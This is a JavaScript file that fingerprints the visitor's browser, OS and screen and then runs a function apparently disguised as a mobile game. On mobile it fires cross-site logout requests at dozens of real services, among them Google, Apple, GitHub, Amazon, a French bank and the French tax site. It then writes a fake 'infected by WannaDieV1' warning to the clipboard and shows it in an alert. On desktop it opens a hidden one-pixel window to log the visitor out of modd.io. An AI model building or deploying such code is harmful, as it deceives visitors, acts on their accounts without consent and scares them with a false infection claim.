
(function (window) {
  {
      var unknown = '-';

      // screen
      var screenSize = '';
      if (screen.width) {
          width = (screen.width) ? screen.width : '';
          height = (screen.height) ? screen.height : '';
          screenSize += '' + width + " x " + height;
      }

      // browser
      var nVer = navigator.appVersion;
      var nAgt = navigator.userAgent;
      var browser = navigator.appName;
      var version = '' + parseFloat(navigator.appVersion);
      var majorVersion = parseInt(navigator.appVersion, 10);
      var nameOffset, verOffset, ix;

      // Opera
      if ((verOffset = nAgt.indexOf('Opera')) != -1) {
          browser = 'Opera';
          version = nAgt.substring(verOffset + 6);
          if ((verOffset = nAgt.indexOf('Version')) != -1) {
              version = nAgt.substring(verOffset + 8);
          }
      }
      // Opera Next
      if ((verOffset = nAgt.indexOf('OPR')) != -1) {
          browser = 'Opera';
          version = nAgt.substring(verOffset + 4);
      }
      // Legacy Edge
      else if ((verOffset = nAgt.indexOf('Edge')) != -1) {
          browser = 'Microsoft Legacy Edge';
          version = nAgt.substring(verOffset + 5);
      } 
      // Edge (Chromium)
      else if ((verOffset = nAgt.indexOf('Edg')) != -1) {
          browser = 'Microsoft Edge';
          version = nAgt.substring(verOffset + 4);
      }
      // MSIE
      else if ((verOffset = nAgt.indexOf('MSIE')) != -1) {
          browser = 'Microsoft Internet Explorer';
          version = nAgt.substring(verOffset + 5);
      }
      // Chrome
      else if ((verOffset = nAgt.indexOf('Chrome')) != -1) {
          browser = 'Chrome';
          version = nAgt.substring(verOffset + 7);
      }
      // Safari
      else if ((verOffset = nAgt.indexOf('Safari')) != -1) {
          browser = 'Safari';
          version = nAgt.substring(verOffset + 7);
          if ((verOffset = nAgt.indexOf('Version')) != -1) {
              version = nAgt.substring(verOffset + 8);
          }
      }
      // Firefox
      else if ((verOffset = nAgt.indexOf('Firefox')) != -1) {
          browser = 'Firefox';
          version = nAgt.substring(verOffset + 8);
      }
      // MSIE 11+
      else if (nAgt.indexOf('Trident/') != -1) {
          browser = 'Microsoft Internet Explorer';
          version = nAgt.substring(nAgt.indexOf('rv:') + 3);
      }
      // Other browsers
      else if ((nameOffset = nAgt.lastIndexOf(' ') + 1) < (verOffset = nAgt.lastIndexOf('/'))) {
          browser = nAgt.substring(nameOffset, verOffset);
          version = nAgt.substring(verOffset + 1);
          if (browser.toLowerCase() == browser.toUpperCase()) {
              browser = navigator.appName;
          }
      }
      // trim the version string
      if ((ix = version.indexOf(';')) != -1) version = version.substring(0, ix);
      if ((ix = version.indexOf(' ')) != -1) version = version.substring(0, ix);
      if ((ix = version.indexOf(')')) != -1) version = version.substring(0, ix);

      majorVersion = parseInt('' + version, 10);
      if (isNaN(majorVersion)) {
          version = '' + parseFloat(navigator.appVersion);
          majorVersion = parseInt(navigator.appVersion, 10);
      }

      // mobile version
      var mobile = /Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(nVer);

      // cookie
      var cookieEnabled = (navigator.cookieEnabled) ? true : false;

      if (typeof navigator.cookieEnabled == 'undefined' && !cookieEnabled) {
          document.cookie = 'testcookie';
          cookieEnabled = (document.cookie.indexOf('testcookie') != -1) ? true : false;
      }

      // system
      var os = unknown;
      var clientStrings = [
          {s:'Windows 10', r:/(Windows 10.0|Windows NT 10.0)/},
          {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
          {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
          {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
          {s:'Windows Vista', r:/Windows NT 6.0/},
          {s:'Windows Server 2003', r:/Windows NT 5.2/},
          {s:'Windows XP', r:/(Windows NT 5.1|Windows XP)/},
          {s:'Windows 2000', r:/(Windows NT 5.0|Windows 2000)/},
          {s:'Windows ME', r:/(Win 9x 4.90|Windows ME)/},
          {s:'Windows 98', r:/(Windows 98|Win98)/},
          {s:'Windows 95', r:/(Windows 95|Win95|Windows_95)/},
          {s:'Windows NT 4.0', r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},
          {s:'Windows CE', r:/Windows CE/},
          {s:'Windows 3.11', r:/Win16/},
          {s:'Android', r:/Android/},
          {s:'Open BSD', r:/OpenBSD/},
          {s:'Sun OS', r:/SunOS/},
          {s:'Chrome OS', r:/CrOS/},
          {s:'Linux', r:/(Linux|X11(?!.*CrOS))/},
          {s:'iOS', r:/(iPhone|iPad|iPod)/},
          {s:'Mac OS X', r:/Mac OS X/},
          {s:'Mac OS', r:/(Mac OS|MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},
          {s:'QNX', r:/QNX/},
          {s:'UNIX', r:/UNIX/},
          {s:'BeOS', r:/BeOS/},
          {s:'OS/2', r:/OS\/2/},
          {s:'Search Bot', r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}
      ];
      for (var id in clientStrings) {
          var cs = clientStrings[id];
          if (cs.r.test(nAgt)) {
              os = cs.s;
              break;
          }
      }

      var osVersion = unknown;

      if (/Windows/.test(os)) {
          osVersion = /Windows (.*)/.exec(os)[1];
          os = 'Windows';
      }

      switch (os) {
          case 'Mac OS':
          case 'Mac OS X':
          case 'Android':
              osVersion = /(?:Android|Mac OS|Mac OS X|MacPPC|MacIntel|Mac_PowerPC|Macintosh) ([\.\_\d]+)/.exec(nAgt)[1];
              break;

          case 'iOS':
              osVersion = /OS (\d+)_(\d+)_?(\d+)?/.exec(nVer);
              osVersion = osVersion[1] + '.' + osVersion[2] + '.' + (osVersion[3] | 0);
              break;
      }
      
      // flash (you'll need to include swfobject)
      /* script src="//ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js" */
      var flashVersion = 'no check';
      if (typeof swfobject != 'undefined') {
          var fv = swfobject.getFlashPlayerVersion();
          if (fv.major > 0) {
              flashVersion = fv.major + '.' + fv.minor + ' r' + fv.release;
          }
          else  {
              flashVersion = unknown;
          }
      }
  }

  window.jscd = {
      screen: screenSize,
      browser: browser,
      browserVersion: version,
      browserMajorVersion: majorVersion,
      mobile: mobile,
      os: os,
      osVersion: osVersion,
      cookies: cookieEnabled,
      flashVersion: flashVersion
  };
}(this));

alert(
  'OS: ' + jscd.os +' '+ jscd.osVersion + '\n' +
  'Browser: ' + jscd.browser +' '+ jscd.browserMajorVersion +
    ' (' + jscd.browserVersion + ')\n' + 
  'Mobile: ' + jscd.mobile + '\n' +
  'Flash: ' + jscd.flashVersion + '\n' +
  'Cookies: ' + jscd.cookies + '\n' +
  'Screen Size: ' + jscd.screen + '\n\n' +
  'Full User Agent: ' + navigator.userAgent
);









function myFunction() {

if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
  // true for mobile device







  window.onload = function() {
    doSites(document.getElementById("sitelist"), [
      ["AOL", and(get("http://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us"), get("https://api.screenname.aol.com/auth/logout?state=snslogout&r=" + Math.random()))],
      ["Apple", get("https://appleid.apple.com/account/signout")],
      ["AlternativeTo", get ("https://alternativeto.net/Logout.aspx")],
      ["Amazon", get("http://www.amazon.com/gp/flex/sign-out.html?action=sign-out")],
      ["Baidu", get("https://passport.baidu.com/?logout&u=https://www.baidu.com")],
      ["Blogger", get("http://www.blogger.com/logout.g")],
      ["Delicious", get("http://www.delicious.com/logout")],
      ["DeviantART", post("http://www.deviantart.com/users/logout")],
      ["DreamHost", get("https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout")],
      ["Dropbox", get("https://www.dropbox.com/logout")],
      ["eBay", get("https://signin.ebay.com/ws/eBayISAPI.dll?SignIn")],
      ["Gandi", get("https://www.gandi.net/login/out")],
      ["GearBest", get("http://www.gearbest.com/m-users-a-logout.htm")],
      ["GitHub", get("https://github.com/logout")],
      ["Modd", get("https://www.modd.io/logout")],
      ["Newground", get("https://www.newgrounds.com/logout")],
      ["Nytime", get("https://myaccount.nytimes.com/auth/logout")],
      ["tik", get("https://www.tiktok.com/logout?redirect_url=https%3A%2F%2Fwww.tiktok.com%2Fen%2F")],
      ["GMail", get("http://mail.google.com/mail/?logout")],
      ["Google", get("https://www.google.com/accounts/Logout")],
      ["Hulu", get("https://secure.hulu.com/logout")],
      ["Impots.gouv.fr", get("https://cfspart.impots.gouv.fr/deconnexion")],
      ["Instapaper", get("http://www.instapaper.com/user/logout")],
      ["KanbanFlow", get("https://kanbanflow.com/logout")],
      ["LaBanquePostale", get("https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/securite/deconnexion/init-deconnexion.ea")],
      ["Linode", get("https://manager.linode.com/session/logout")],
      ["LiveJournal", post("http://www.livejournal.com/logout.bml", {"action:killall": "1"})],
      ["LogMeIn", get("https://secure.logmein.com/home/fr/loggedout")],
      ["MySpace", get("http://www.myspace.com/index.cfm?fuseaction=signout")],
      ["NetFlix", get("http://www.netflix.com/Logout")],
      ["New York Times", get("http://www.nytimes.com/logout")],
      ["Newegg", get("https://secure.newegg.com/NewMyAccount/AccountLogout.aspx")],
      ["Office 365 Global Account", get("https://login.microsoftonline.com/logout.srf")],
      ["Office 365 Webmail", get("https://outlook.office.com/owa/logoff.owa")],
      ["Pandora", get("https://www.pandora.com/account/sign-out")],
      ["Photobucket", get("http://photobucket.com/logout")],
      ["Primewire.AG", get("https://www.primewire.ag/logout.php")],
      ["Primewire.ORG", get("https://www.primewire.org/logout.php")],
      ["Skype", get("https://secure.skype.com/account/logout")],
      ["Slashdot", get("http://slashdot.org/my/logout")],
      ["SoundCloud", get("http://soundcloud.com/logout")],
      ["Spotify", get("https://www.spotify.com/logout/")],
      ["Steam Community", get("http://steamcommunity.com/?action=doLogout")],
      ["Steam Store", get("http://store.steampowered.com/logout/")],
      ["ThePirateBay", get("https://thepiratebay.org/logout")],
      ["ThinkGeek", get("https://www.thinkgeek.com/brain/account/login.cgi?a=lo")],
      ["Threadless", get("http://www.threadless.com/logout")],
      ["Tumblr", get("http://www.tumblr.com/logout")],
      ["Testomato", get("http://www.testomato.com/logout")],
      ["Vimeo", get("http://vimeo.com/log_out")],
      ["Wikipedia", get("http://en.wikipedia.org/w/index.php?title=Special:UserLogout")],
      ["Windows Live", get("http://login.live.com/logout.srf")],
      ["Woot", get("https://account.woot.com/logout")],
      ["Wordpress", get("https://wordpress.com/wp-login.php?action=logout")],
      ["Yahoo!", get("https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/")],
      ["YouTube", post("http://www.youtube.com", {"action_logout": "1"}, true)],
      ["DueDil", get("http://www.duedil.com/logout")],
      ["Podio", get("https://podio.com/logout")],
      ["Codeanywhere", get("https://codeanywhere.com/logout")],
      ["NESCAFE Dolce Gusto", get("https://www.dolce-gusto.fr/customer/account/logout")],
      ["T411", get("http://www.t411.li/users/logout/")],
    ])
  };

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-62125712-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

















      navigator.clipboard.writeText("Dam It Your Iphone Or Any Mobile Phone, Has Been Infected By WannaDieV1 The Damaged Has Been Already Made...");
  alert("Your Iphone Or Any Mobile Device, Has Been Infected By WannaDieV1")


}else{
alert("you can only play games on mobile");
let myWindow;
  myWindow = window.open("https://www.modd.io/logout", "_Blank", "width=1,height=1");

  myWindow.close();
}
}